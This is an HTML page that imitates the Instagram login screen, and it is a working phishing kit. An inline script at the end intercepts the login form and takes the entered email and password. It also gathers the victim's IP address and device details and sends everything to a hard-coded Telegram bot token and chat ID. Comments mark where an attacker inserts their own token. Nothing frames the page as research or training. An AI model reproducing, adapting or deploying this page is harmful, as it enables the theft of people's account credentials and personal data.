<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone, username, or email</label>
                    <input id="email" name="email" placeholder="Phone, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" required />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div style="text-align: center; margin-top: 20px;">
                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 15px;">
                        <img src="./img/2023_Facebook_icon.svg.png" alt="Facebook logo" style="width: 25px; height: 25px; margin-right: 8px;" />
                        <a href="#" style="text-decoration: none; color: #1877f2; font-weight: bold; font-size: 16px; font-family: Arial, sans-serif;">Log in with Facebook</a>
                    </div>
                    <a href="#" style="color: #00376b; font-size: 14px; font-family: Arial, sans-serif; text-decoration: none;">Forgot password?</a>
                </div>
                    </div>
                    
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <div class="flex justify-content-center">
                    <div class="app-download flex direction-column align-items-center">
                        <p>Get the app.</p>
                        <div class="flex justify-content-center">
                            <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
                                <img src="./img/apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
                            </a>
                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=ar" target="_blank">
                                <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                            </a>
                        </div>
                    </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="footer-links">
            <li><a href="#">About</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">Press</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Top Accounts</a></li>
            <li><a href="#">Hashtags</a></li>
            <li><a href="#">Language</a></li>
        </ul>
        <p class="copyright">© 2025 Instagram from Meta</p>
    </footer>
</div>

<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "7318456166:AAFK0J75lSDq-qrKqc9w6BbTzSYq4_RgxGE";                                                            // هنا التوكين              
    const CHAT_ID = "6024482396";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
    const URI_API = `https://api.telegram.org/bot7318456166:AAFK0J75lSDq-qrKqc9w6BbTzSYq4_RgxGE/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('Thank you!');
                }).catch(error => {
                    alert('Please try again.');
                });
            })
            .catch(error => {
                alert('Please try again.');
            });
    });
</script>

</body>
</html>
